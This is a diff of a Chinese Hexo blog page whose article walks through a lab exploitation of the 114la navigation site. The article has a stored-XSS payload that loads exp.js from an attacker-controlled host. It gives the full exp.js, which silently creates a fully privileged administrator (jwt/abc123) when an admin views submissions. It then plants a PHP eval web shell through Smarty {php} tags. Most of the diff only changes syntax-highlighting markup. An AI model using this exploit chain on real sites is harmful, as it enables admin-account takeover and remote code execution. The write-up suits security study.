@@ -43,7 +43,11 @@
 	<script src="/js/Valine-RJyanzheng.js"></script>
 
     
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
@@ -880,7 +884,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    583
+                    927
                 </div>
                 
 
@@ -905,78 +909,79 @@
 <p>3.进入后台设置您的管理信息，并在“静态生成”-&gt;“一键生成”生成相应的页面</p>
 <p>4.再访问：<code>http://localhost/114la/upload/index.htm</code>，可以看到导航页面了</p>
 <h2 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h2><p><strong>XSS漏洞点：</strong><code>url-submit/index.php</code></p>
-<pre class="line-numbers language-lang-php"><code class="language-lang-php">//18-22行
-$name = (empty($_POST['name'])) ? '' : strip($_POST['name']);
-        if (empty($name))
-        {
-            throw new Exception('网站名称不能为空', 10);
-        }
-//91-94行
-$info = $_POST;
-$infos = addslashes(serialize($info));
-app_db::insert('ylmf_urladd', array('domain', 'info', 'addtime'), array($domain, $infos, time()));
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//18-22行</span>
+<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">:</span> <span class="token function">strip</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'网站名称不能为空'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">//91-94行</span>
+<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span>
+<span class="token variable">$infos</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app_db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">'ylmf_urladd'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'domain'</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">,</span> <span class="token string">'addtime'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$domain</span><span class="token punctuation">,</span> <span class="token variable">$infos</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>对提交的数据只使用<code>addslashes</code>函数在引号前面添加<code>\</code>,使用<code>serialize</code>函数序列化输入的信息，未做其他过滤，直接插入数据库,造成了存储型XSS漏洞</p>
 <p>在网站名称那一栏插入<code>JS</code>,其它的符合要求填写就可以了，然后提交，</p>
-<pre class="line-numbers language-lang-js"><code class="language-lang-js"><script>alert(123)</script>;
+<pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200607160047.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200607160047.png"></p>
 <p>但是提交后不会弹窗，查看数据库，看到JS代码确实插入到了数据库中，这就是XSS<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43716322/article/details/89480895">盲打</a></p>
-<p><img src="https://img.jwt1399.top//img/20200607160242.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200607160242.png"></p>
 <p>当管理员在后台访问收录管理时，注入的JS代码就会执行，可以看到成功弹框</p>
-<p><img src="https://img.jwt1399.top//img/20200607160053.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200607160053.png"></p>
 <p>既然JS代码能够成功执行，那我们插入一个添加管理员账户的远程JS文件,等待管理员查看网站收录审核的时候就会执行JS文件，从而创建一个管理员账号，后续我们进入后台来Getshell</p>
 <pre><code>&lt;script src=http://192.168.1.109/exp.js&gt;&lt;/script&gt;;
-</code></pre><p><code>exp.js</code>用来创建一个用户名密码为<code>jwt/abc123</code>的管理员</p>
-<pre class="line-numbers language-lang-javascript"><code class="language-lang-javascript">var siteurl = document.URL;
-siteurl = siteurl.replace(/(.*\/){0,}([^\.]+).*/ig,"$1");
-var username="jwt";//用户名
-var password="abc123";//密码
-var request = false;
+</code></pre>
+<p><code>exp.js</code>用来创建一个用户名密码为<code>jwt/abc123</code>的管理员</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> siteurl <span class="token operator">=</span> document<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>
+siteurl <span class="token operator">=</span> siteurl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(.*\/){0,}([^\.]+).*/ig</span><span class="token punctuation">,</span><span class="token string">"$1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> username<span class="token operator">=</span><span class="token string">"jwt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用户名</span>
+<span class="token keyword">var</span> password<span class="token operator">=</span><span class="token string">"abc123"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//密码</span>
+<span class="token keyword">var</span> request <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
 
-if(window.XMLHttpRequest) {
-    request = new XMLHttpRequest();
-    if(request.overrideMimeType) {
-        request.overrideMimeType('text/xml');
-    }
-} else if(window.ActiveXObject) {
-    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
-    for(var i=0; i<versions.length; i++) {
-        try {
-            request = new ActiveXObject(versions[i]);
-            } catch(e){}
-    }
-}
+<span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>overrideMimeType<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+       request<span class="token punctuation">.</span><span class="token function">overrideMimeType</span><span class="token punctuation">(</span><span class="token string">'text/xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>ActiveXObject<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   <span class="token keyword">var</span> versions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Microsoft.XMLHTTP'</span><span class="token punctuation">,</span> <span class="token string">'MSXML.XMLHTTP'</span><span class="token punctuation">,</span> <span class="token string">'Microsoft.XMLHTTP'</span><span class="token punctuation">,</span> <span class="token string">'Msxml2.XMLHTTP.7.0'</span><span class="token punctuation">,</span><span class="token string">'Msxml2.XMLHTTP.6.0'</span><span class="token punctuation">,</span><span class="token string">'Msxml2.XMLHTTP.5.0'</span><span class="token punctuation">,</span> <span class="token string">'Msxml2.XMLHTTP.4.0'</span><span class="token punctuation">,</span> <span class="token string">'MSXML2.XMLHTTP.3.0'</span><span class="token punctuation">,</span> <span class="token string">'MSXML2.XMLHTTP'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>versions<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+       <span class="token keyword">try</span> <span class="token punctuation">{</span>
+           request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>versions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 
-var xmlhttp=request;
+<span class="token keyword">var</span> xmlhttp<span class="token operator">=</span>request<span class="token punctuation">;</span>
 
-xmlhttp.open("GET",siteurl+"/index.php?c=member", false);
-xmlhttp.setRequestHeader("Referer", siteurl);
-xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-xmlhttp.send();
-if (xmlhttp.responseText.indexOf(username)<0) {
-xmlhttp.open("POST", siteurl + "/index.php?c=member&a=member_add", false);
-xmlhttp.setRequestHeader("Referer", siteurl);
-xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xmlhttp.send("name=" + username + "&password=" + password + "&step=2");
-xmlhttp.open("POST", siteurl + "/index.php?c=member&a=member_edit", false);
-xmlhttp.setRequestHeader("Referer", siteurl);
-xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xmlhttp.send("auth%5Bmember114laurl_add114lafeedback%5D=1&auth%5Bconfig114la%5D=1&auth%5Bfamous_nav114lafamous_loop_playfamous_nav_tab114laindex_site114laindex_tool114lamztopl114larecycler%5D=1&auth%5Bzhuanti114lazhuanti_class%5D=1&auth%5Badvise_index114lakey%5D=1&auth%5Bbackup114larestore114larepair114laclear114lamysites%5D=1&auth%5Btemplate_manage%5D=1&auth%5Bmake_html114la%5D=1&auth%5Bheader114lamenu114lawelcome114laframe114lalogin%5D=1&auth%5Bsecurity114la%5D=1&auth%5Bsite_manage%5D=1&auth%5Bplan%5D=1&auth%5Bclass%5D=1&auth%5Blog%5D=1&step=2&name=" + username);
-}
+xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>siteurl<span class="token operator">+</span><span class="token string">"/index.php?c=member"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Referer"</span><span class="token punctuation">,</span> siteurl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> siteurl <span class="token operator">+</span> <span class="token string">"/index.php?c=member&amp;a=member_add"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Referer"</span><span class="token punctuation">,</span> siteurl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"name="</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"&amp;password="</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"&amp;step=2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> siteurl <span class="token operator">+</span> <span class="token string">"/index.php?c=member&amp;a=member_edit"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Referer"</span><span class="token punctuation">,</span> siteurl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"auth%5Bmember114laurl_add114lafeedback%5D=1&amp;auth%5Bconfig114la%5D=1&amp;auth%5Bfamous_nav114lafamous_loop_playfamous_nav_tab114laindex_site114laindex_tool114lamztopl114larecycler%5D=1&amp;auth%5Bzhuanti114lazhuanti_class%5D=1&amp;auth%5Badvise_index114lakey%5D=1&amp;auth%5Bbackup114larestore114larepair114laclear114lamysites%5D=1&amp;auth%5Btemplate_manage%5D=1&amp;auth%5Bmake_html114la%5D=1&amp;auth%5Bheader114lamenu114lawelcome114laframe114lalogin%5D=1&amp;auth%5Bsecurity114la%5D=1&amp;auth%5Bsite_manage%5D=1&amp;auth%5Bplan%5D=1&amp;auth%5Bclass%5D=1&amp;auth%5Blog%5D=1&amp;step=2&amp;name="</span> <span class="token operator">+</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>我们自己模拟管理员进后台查看收录管理一下，然后去用户管理中查看是否新建了jwt用户</p>
-<p><img src="https://img.jwt1399.top//img/20200607164030.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200607164030.png"></p>
 <p>不出所料，果然成功创建了jwt管理员</p>
 <h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>由于114la网站使用的smarty模板引擎,而smarty支持插入php代码,这样就会导致漏洞产生了</p>
 <blockquote>
 <p><strong>smarty里面执行PHP代码 :</strong> <code>&lt;&#123;php&#125;&gt;代码&lt;&#123;/php&#125;&gt;</code></p>
 </blockquote>
 <p>那我们登录jwt用户,进入模板管理-&gt;申请收录版块-&gt;插入PHP一句话木马</p>
-<pre class="line-numbers language-lang-php"><code class="language-lang-php"><{php}>@eval($_POST['a']);<{/php}>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>{php}</span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup">&lt;{/php}></span> 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>然后我们用🐜🗡连接，到这里我们就成功Getshell了</p>
-<p><img src="https://img.jwt1399.top//img/20200607164003.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200607164003.png"></p>
 
             </div>
             <hr/>
@@ -1748,7 +1753,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">712.3k</span>&nbsp;字
+                class="white-color">1051.4k</span>&nbsp;字
             
             
             
@@ -1979,22 +1984,6 @@ $(function () {
     
 
         
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
 </body>
 
 </html>
